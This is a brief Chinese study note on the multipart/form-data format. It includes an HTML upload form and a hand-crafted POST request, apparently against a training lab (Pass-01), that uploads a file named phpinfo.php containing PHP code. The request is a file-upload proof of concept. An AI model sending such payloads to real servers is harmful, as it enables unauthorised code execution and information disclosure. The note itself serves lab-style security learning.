
---


multipart/form-data的定义
媒体类型multipart/form-data遵循multipartMiME数据流定义（该定义可以参考Section5.1-RFC2046）
大概含义就是：媒体类型multipart/form-data的数据体由
(Boundary)
多个部分组成，这些部分由一个固定边界值分隔。
![[屏幕截图 2024-12-11 203230.png]]


```
提交的form

<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
	<p>请选择要上传的图片：<p>
	<input class="input_file" type="file" name="upload_file"/>
	<input class="button" type="submit" name="submit" value="上传"/>
</form>




构造的pyload为
POST /Pass-01/index.php HTTP/1.1 
Host: 172.250.250.14
Content-Type: multipart/form-data; boundary=----15638190551882
Content-Length:318

-----------------------------15638190551882
Content-Disposition: form-data; name="upload_file"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

-----------------------------15638190551882
Content-Disposition: form-data; name="submit"

上传
-----------------------------15638190551882--

```